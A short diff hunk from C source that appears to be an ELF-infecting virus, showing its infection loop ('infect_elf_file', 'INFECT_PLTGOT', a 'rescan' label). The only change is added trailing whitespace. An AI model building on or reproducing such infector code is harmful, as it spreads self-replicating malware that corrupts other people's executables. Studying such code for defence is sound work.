@@ -817,7 +817,7 @@ rescan:
 infect:
 			load_target(fpath, &target);
 			new_base = infect_elf_file(&self, &target);
-			unload_target(&target);
+			unload_target(&target); 
 #ifdef INFECT_PLTGOT
 			load_target_writeable(TMP, &target);
 			base_addr = PIC_RESOLVE_ADDR(&_start);
